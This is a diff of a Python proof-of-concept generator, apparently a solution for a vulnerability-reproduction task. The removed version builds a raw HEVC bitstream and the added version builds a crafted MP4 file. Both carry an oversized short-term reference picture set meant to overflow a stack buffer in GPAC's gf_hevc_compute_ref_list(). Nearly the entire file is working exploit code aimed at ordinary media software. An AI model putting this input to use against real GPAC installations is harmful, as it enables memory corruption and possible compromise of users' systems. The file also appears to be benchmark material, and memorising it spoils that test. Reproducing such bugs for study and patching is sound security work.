@@ -1,217 +1,183 @@
-import sys
+import struct
 
 class Solution:
     """
-    Generates a Proof-of-Concept input that triggers a Stack Buffer Overflow
-    in the gf_hevc_compute_ref_list() function.
-    
-    The vulnerability is caused by insufficient checks when processing a
-    Short-Term Reference Picture Set (RPS) from an HEVC bitstream.
-    Specifically, the number of pictures in the RPS can be larger than
-    the fixed-size stack buffers used to store their information.
+    Generates a Proof-of-Concept input for a Stack Buffer Overflow
+    in gf_hevc_compute_ref_list().
 
-    The PoC consists of a minimal raw HEVC (H.265) Annex B bitstream
-    containing four NAL units:
-    1. VPS (Video Parameter Set): Basic video configuration.
-    2. SPS (Sequence Parameter Set): Contains the malicious RPS. We configure
-       it to allow a large number of reference pictures and then define an
-       RPS with more pictures (e.g., 20) than the stack buffer size (16).
-    3. PPS (Picture Parameter Set): Links to the SPS.
-    4. Slice Header: A P-slice that references and activates the malicious
-       RPS defined in the SPS. This triggers the call to the vulnerable
-       function `gf_hevc_compute_ref_list`, which then overflows its stack
-       buffers while processing the oversized RPS.
+    The PoC is a crafted MP4 file containing a single HEVC I-frame. The slice
+    header of this frame is manipulated to specify a large number of reference
+    pictures in its Short-Term Reference Picture Set (ST-RPS). When the GPAC
+    parser processes this slice, the `gf_hevc_compute_ref_list` function attempts
+    to populate a fixed-size stack buffer with this large number of references,
+    leading to a stack-based buffer overflow.
     """
 
-    class BitStream:
-        """Helper class to write data bit-by-bit."""
+    class _BitWriter:
+        """A helper class to write bitstreams."""
         def __init__(self):
-            self.buffer = bytearray()
+            self.data = bytearray()
             self.byte = 0
-            self.bit_pos = 0
+            self.bit_pos = 7
 
         def write_bit(self, bit: int):
             if bit:
-                self.byte |= (1 << (7 - self.bit_pos))
-            self.bit_pos += 1
-            if self.bit_pos == 8:
-                self.buffer.append(self.byte)
+                self.byte |= (1 << self.bit_pos)
+            self.bit_pos -= 1
+            if self.bit_pos < 0:
+                self.data.append(self.byte)
                 self.byte = 0
-                self.bit_pos = 0
+                self.bit_pos = 7
 
-        def write_bits(self, value: int, n: int):
-            for i in range(n):
-                bit = (value >> (n - 1 - i)) & 1
-                self.write_bit(bit)
+        def write_bits(self, value: int, num_bits: int):
+            for i in range(num_bits - 1, -1, -1):
+                self.write_bit((value >> i) & 1)
 
-        def write_ue(self, value: int): # Unsigned Exp-Golomb
-            temp = value + 1
-            num_bits = temp.bit_length()
+        def write_ue(self, value: int):
+            """Writes an unsigned Exp-Golomb coded integer."""
+            x = value + 1
+            num_bits = x.bit_length()
             leading_zeros = num_bits - 1
-            
             self.write_bits(0, leading_zeros)
-            self.write_bits(temp, num_bits)
+            self.write_bits(x, num_bits)
 
-        def write_se(self, value: int): # Signed Exp-Golomb
-            if value <= 0:
-                uv = -2 * value
-            else:
-                uv = 2 * value - 1
-            self.write_ue(uv)
+        def write_rbsp_trailing_bits(self):
+            """Writes the RBSP trailing bits to align the bitstream to a byte."""
+            self.write_bit(1)  # rbsp_stop_one_bit
+            while self.bit_pos != 7:
+                self.write_bit(0)
 
-        def byte_align(self):
-            if self.bit_pos > 0:
-                self.write_bit(1)
-                while self.bit_pos != 0:
-                    self.write_bit(0)
-        
         def get_bytes(self) -> bytes:
-            # Finalize buffer if it's not byte-aligned
-            if self.bit_pos > 0:
-                self.buffer.append(self.byte)
-            return bytes(self.buffer)
+            """Returns the written data as bytes, including any partial final byte."""
+            final_data = self.data
+            if self.bit_pos != 7:
+                final_data.append(self.byte)
+            return bytes(final_data)
 
-    def solve(self, src_path: str) -> bytes:
-        start_code = b'\x00\x00\x00\x01'
+    def _box(self, box_type: bytes, content: bytes) -> bytes:
+        """Creates a standard MP4 box with a 32-bit size field."""
+        size = 8 + len(content)
+        return struct.pack('>I', size) + box_type + content
+
+    def _create_slice_nalu(self) -> bytes:
+        """Creates the malicious HEVC slice NAL unit."""
+        bw = self._BitWriter()
+
+        # NAL Unit Header: IDR_W_RADL (type 19), nuh_layer_id=0, nuh_temporal_id_plus1=1
+        bw.write_bits(0b0010011000000001, 16)
+
+        # Slice Segment Header
+        bw.write_bit(1)  # first_slice_segment_in_pic_flag
+        bw.write_bit(0)  # no_output_of_prior_pics_flag
+        bw.write_ue(0)   # slice_pic_parameter_set_id
+        bw.write_ue(2)   # slice_type = I_SLICE (2)
         
-        # The stack buffers in the vulnerable function have a size of 16.
-        # We use a value > 16 to trigger the overflow.
-        VULN_COUNT = 20
-
-        # NAL Unit Types
-        NAL_VPS = 32
-        NAL_SPS = 33
-        NAL_PPS = 34
-        NAL_TRAIL_R = 1 # P-Slice
-
-        # Create NAL unit payloads
-        vps_payload = self._create_vps()
-        sps_payload = self._create_sps(VULN_COUNT)
-        pps_payload = self._create_pps()
-        slice_payload = self._create_slice()
-
-        # Assemble the final Annex B bitstream
-        poc = bytearray()
-        poc.extend(start_code + self._nal_header(NAL_VPS) + vps_payload)
-        poc.extend(start_code + self._nal_header(NAL_SPS) + sps_payload)
-        poc.extend(start_code + self._nal_header(NAL_PPS) + pps_payload)
-        poc.extend(start_code + self._nal_header(NAL_TRAIL_R) + slice_payload)
+        # Specify RPS in slice header
+        bw.write_bit(0)  # short_term_ref_pic_set_sps_flag = 0
         
-        return bytes(poc)
-
-    def _nal_header(self, nal_type: int) -> bytes:
-        # F=0 (1b), Type (6b), LayerId=0 (6b), TID=1 (3b)
-        val = (nal_type << 9) | 1
-        return val.to_bytes(2, 'big')
-
-    def _create_vps(self) -> bytes:
-        bs = self.BitStream()
-        bs.write_bits(0, 4)       # vps_video_parameter_set_id
-        bs.write_bits(3, 2)       # vps_reserved_three_2bits
-        bs.write_bits(0, 6)       # vps_max_layers_minus1
-        bs.write_bits(0, 3)       # vps_max_sub_layers_minus1
-        bs.write_bit(1)           # vps_temporal_id_nesting_flag
-        bs.write_bits(0xFFFF, 16) # vps_reserved_0xffff_16bits
+        # Short-Term Reference Picture Set (ST-RPS) structure
+        bw.write_bit(0)  # inter_ref_pic_set_prediction_flag
         
-        # profile_tier_level (Main Profile)
-        bs.write_bits(0, 2)       # general_profile_space
-        bs.write_bit(0)           # general_tier_flag
-        bs.write_bits(1, 5)       # general_profile_idc
-        bs.write_bits(0, 32)      # general_profile_compatibility_flags
-        bs.write_bits(0, 48)      # constraint flags, etc.
-        bs.write_bits(0, 8)       # general_level_idc
-
-        bs.write_bit(0)           # vps_sub_layer_ordering_info_present_flag
-        bs.write_ue(0)            # vps_max_dec_pic_buffering_minus1
-        bs.write_ue(0)            # vps_max_num_reorder_pics
-        bs.write_ue(0)            # vps_max_latency_increase_plus1
-
-        bs.write_bits(0, 6)       # vps_max_layer_id
-        bs.write_ue(0)            # vps_num_layer_sets_minus1
-        bs.write_bit(0)           # vps_timing_info_present_flag
-        bs.write_bit(0)           # vps_extension_flag
-        bs.byte_align()
-        return bs.get_bytes()
-
-    def _create_sps(self, vuln_count: int) -> bytes:
-        bs = self.BitStream()
-        bs.write_bits(0, 4)       # sps_video_parameter_set_id
-        bs.write_bits(0, 3)       # sps_max_sub_layers_minus1
-        bs.write_bit(1)           # sps_temporal_id_nesting_flag
+        # VULNERABILITY PAYLOAD: Specify a large number of negative reference pictures
+        # to overflow the stack buffer in the target function.
+        num_negative_pics = 64
+        num_positive_pics = 0
         
-        # profile_tier_level (same as VPS)
-        bs.write_bits(0, 2); bs.write_bit(0); bs.write_bits(1, 5)
-        bs.write_bits(0, 32); bs.write_bits(0, 48); bs.write_bits(0, 8)
-
-        bs.write_ue(0)            # sps_seq_parameter_set_id
-        bs.write_ue(1)            # chroma_format_idc
-        bs.write_bit(0)           # separate_colour_plane_flag
-        bs.write_ue(352)          # pic_width_in_luma_samples
-        bs.write_ue(288)          # pic_height_in_luma_samples
-        bs.write_bit(0)           # conformance_window_flag
-        bs.write_ue(0)            # bit_depth_luma_minus8
-        bs.write_ue(0)            # bit_depth_chroma_minus8
-        bs.write_ue(4)            # log2_max_pic_order_cnt_lsb_minus4
-        bs.write_bit(0)           # sps_sub_layer_ordering_info_present_flag
+        bw.write_ue(num_negative_pics)
+        bw.write_ue(num_positive_pics)
         
-        # This value must be >= vuln_count for the RPS to be valid.
-        bs.write_ue(vuln_count)   # sps_max_dec_pic_buffering_minus1
-        bs.write_ue(0)            # sps_max_num_reorder_pics
-        bs.write_ue(0)            # sps_max_latency_increase_plus1
-        
-        bs.write_ue(0); bs.write_ue(3); bs.write_ue(0); bs.write_ue(3) # log2 params
-        bs.write_ue(0); bs.write_ue(0) # transform hierarchy
-        bs.write_bit(0); bs.write_bit(0); bs.write_bit(0); bs.write_bit(0) # flags
-        
-        # Malicious RPS definition
-        bs.write_ue(1)            # num_short_term_ref_pic_sets
-        bs.write_bit(0)           # inter_ref_pic_set_prediction_flag
-        bs.write_ue(vuln_count)   # num_negative_pics
-        bs.write_ue(0)            # num_positive_pics
-        for i in range(vuln_count):
-            bs.write_ue(i)        # delta_poc_s0_minus1
-            bs.write_bit(1)       # used_by_curr_pic_s0_flag
+        # Populate the ST-RPS data for each negative picture
+        for i in range(num_negative_pics):
+            bw.write_ue(i)      # delta_poc_s0_minus1[i]
+            bw.write_bit(1)     # used_by_curr_pic_s0_flag[i]
             
-        bs.write_bit(0)           # long_term_ref_pics_present_flag
-        bs.write_bit(0)           # sps_temporal_mvp_enabled_flag
-        bs.write_bit(0)           # strong_intra_smoothing_enabled_flag
-        bs.write_bit(0)           # vui_parameters_present_flag
-        bs.write_bit(0)           # sps_extension_present_flag
-        bs.byte_align()
-        return bs.get_bytes()
+        # Minimal values for the rest of the slice header
+        bw.write_bit(0)         # num_ref_idx_active_override_flag
+        bw.write_bit(0)         # cabac_init_flag
+        
+        # Finalize the NAL unit
+        bw.write_rbsp_trailing_bits()
 
-    def _create_pps(self) -> bytes:
-        bs = self.BitStream()
-        bs.write_ue(0); bs.write_ue(0); bs.write_bit(0); bs.write_bit(0)
-        bs.write_bits(0, 3); bs.write_bit(0); bs.write_bit(0); bs.write_ue(0)
-        bs.write_ue(0); bs.write_se(0); bs.write_bit(0); bs.write_bit(0)
-        bs.write_bit(0); bs.write_se(0); bs.write_se(0); bs.write_bit(0)
-        bs.write_bit(0); bs.write_bit(0); bs.write_bit(0); bs.write_bit(0)
-        bs.write_bit(0); bs.write_bit(0); bs.write_bit(0); bs.write_bit(0)
-        bs.write_bit(0); bs.write_ue(0); bs.write_bit(0); bs.write_bit(0)
-        bs.byte_align()
-        return bs.get_bytes()
+        return bw.get_bytes()
+        
+    def solve(self, src_path: str) -> bytes:
+        slice_nalu = self._create_slice_nalu()
 
-    def _create_slice(self) -> bytes:
-        bs = self.BitStream()
-        bs.write_bit(1)       # first_slice_segment_in_pic_flag
-        bs.write_ue(0)        # slice_pic_parameter_set_id
-        bs.write_ue(1)        # slice_type (P)
-        # log2_max_pic_order_cnt_lsb_minus4=4 in SPS, so width is 4+4=8
-        bs.write_bits(0, 8)   # slice_pic_order_cnt_lsb
+        vps = b'\x40\x01\x0c\x01\xff\xff\x01\x60\x00\x00\x03\x00\x90\x00\x00\x03\x00\x00\x03\x00\x78\x9d\xc0\x90'
+        sps = b'\x42\x01\x01\x01\x60\x00\x00\x03\x00\x90\x00\x00\x03\x00\x00\x03\x00\x78\xa0\x03\xc0\x80\x10\xe5\x96\x69\x24\xca'
+        pps = b'\x44\x01\xc0\x73\xc0\x49\x24'
         
-        # Activate the RPS from the SPS
-        bs.write_bit(1)       # short_term_ref_pic_set_sps_flag
+        ftyp_content = b'isom\x00\x00\x02\x00isomiso2avc1mp41'
+        ftyp_box = self._box(b'ftyp', ftyp_content)
+
+        mdat_content = struct.pack('>I', len(slice_nalu)) + slice_nalu
+
+        # Build moov box and its children from the inside out
+        hvcc_nalu_arrays = (
+            b'\xa0' + struct.pack('>H', 1) + struct.pack('>H', len(vps)) + vps +
+            b'\xa1' + struct.pack('>H', 1) + struct.pack('>H', len(sps)) + sps +
+            b'\xa2' + struct.pack('>H', 1) + struct.pack('>H', len(pps)) + pps
+        )
+        hvcc_header = b'\x01\x01\x60\x00\x00\x00\x90\x00\x00\x00\x00\x00\x78\xf0\x00\xfc\xfd\xf8\xf8\x00\x00\x0f'
+        hvcc_content = hvcc_header + struct.pack('B', 3) + hvcc_nalu_arrays
+        hvcc_box = self._box(b'hvcC', hvcc_content)
         
-        # Minimal remaining fields for a simple P-slice
-        bs.write_ue(0)        # num_long_term_sps
-        bs.write_ue(0)        # num_long_term_pics
-        bs.write_bit(0)       # num_ref_idx_active_override_flag
-        bs.write_bit(0)       # ref_pic_list_modification_flag_l0
-        bs.write_se(0)        # slice_qp_delta
+        hvc1_content = (
+            b'\x00'*6 + struct.pack('>H', 1) + b'\x00'*16 +
+            struct.pack('>HHII', 64, 64, 0x00480000, 0x00480000) +
+            b'\x00'*4 + struct.pack('>H', 1) + b'\x00'*32 +
+            struct.pack('>Hh', 24, -1) + hvcc_box
+        )
+        hvc1_box = self._box(b'hvc1', hvc1_content)
+        stsd_content = b'\x00\x00\x00\x00' + struct.pack('>I', 1) + hvc1_box
+        stsd_box = self._box(b'stsd', stsd_content)
+
+        stts_content = b'\x00\x00\x00\x00' + struct.pack('>I', 1) + struct.pack('>II', 1, 1000)
+        stts_box = self._box(b'stts', stts_content)
+        stsc_content = b'\x00\x00\x00\x00' + struct.pack('>I', 1) + struct.pack('>III', 1, 1, 1)
+        stsc_box = self._box(b'stsc', stsc_content)
+        stsz_content = b'\x00\x00\x00\x00' + struct.pack('>I', 0) + struct.pack('>I', 1) + struct.pack('>I', len(slice_nalu))
+        stsz_box = self._box(b'stsz', stsz_content)
+
+        stbl_content_without_stco = stsd_box + stts_box + stsc_box + stsz_box
         
-        # Minimal slice data: just the end of slice bit
-        bs.byte_align()
-        bs.write_bit(1)
-        bs.byte_align()
-        return bs.get_bytes()
+        vmhd_content = b'\x00\x00\x00\x01' + b'\x00'*8
+        vmhd_box = self._box(b'vmhd', vmhd_content)
+        dref_content = b'\x00\x00\x00\x00' + struct.pack('>I', 1) + self._box(b'url ', b'\x00\x00\x00\x01')
+        dinf_box = self._box(b'dinf', self._box(b'dref', dref_content))
+        minf_content_without_stbl = vmhd_box + dinf_box
+        
+        mdhd_content = b'\x00'*4 + struct.pack('>IIIIH', 0, 0, 1000, 1000, 0x55c4) + b'\x00\x00'
+        mdhd_box = self._box(b'mdhd', mdhd_content)
+        hdlr_content = b'\x00'*8 + b'vide' + b'\x00'*12 + b'VideoHandler\x00'
+        hdlr_box = self._box(b'hdlr', hdlr_content)
+        mdia_content_without_minf = mdhd_box + hdlr_box
+        
+        tkhd_content = b'\x00\x00\x00\x07' + struct.pack('>IIII', 0, 0, 1, 0) + struct.pack('>I', 1000) + b'\x00'*8 + b'\x00\x00\x00\x00' + b'\x01\x00\x00\x00' + b'\x00'*36 + struct.pack('>II', 64 << 16, 64 << 16)
+        tkhd_box = self._box(b'tkhd', tkhd_content)
+        
+        mvhd_content = b'\x00'*4 + struct.pack('>IIII', 0, 0, 1000, 1000) + struct.pack('>iH', 0x00010000, 0x0100) + b'\x00'*10 + b'\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' + b'\x00'*24 + struct.pack('>I', 2)
+        mvhd_box = self._box(b'mvhd', mvhd_content)
+
+        # Calculate final moov size to determine mdat offset for stco
+        stco_box_size = 20
+        stbl_size = 8 + len(stbl_content_without_stco) + stco_box_size
+        minf_size = 8 + len(minf_content_without_stbl) + stbl_size
+        mdia_size = 8 + len(mdia_content_without_minf) + minf_size
+        trak_size = 8 + len(tkhd_box) + mdia_size
+        moov_size = 8 + len(mvhd_box) + trak_size
+        
+        mdat_offset = len(ftyp_box) + moov_size
+        sample_offset = mdat_offset + 8
+        stco_content = b'\x00\x00\x00\x00' + struct.pack('>I', 1) + struct.pack('>I', sample_offset)
+        stco_box = self._box(b'stco', stco_content)
+        
+        # Assemble final boxes with correct sizes and offsets
+        stbl_box = self._box(b'stbl', stbl_content_without_stco + stco_box)
+        minf_box = self._box(b'minf', minf_content_without_stbl + stbl_box)
+        mdia_box = self._box(b'mdia', mdia_content_without_minf + minf_box)
+        trak_box = self._box(b'trak', tkhd_box + mdia_box)
+        moov_box = self._box(b'moov', mvhd_box + trak_box)
+        mdat_box = self._box(b'mdat', mdat_content)
+
+        return ftyp_box + moov_box + mdat_box
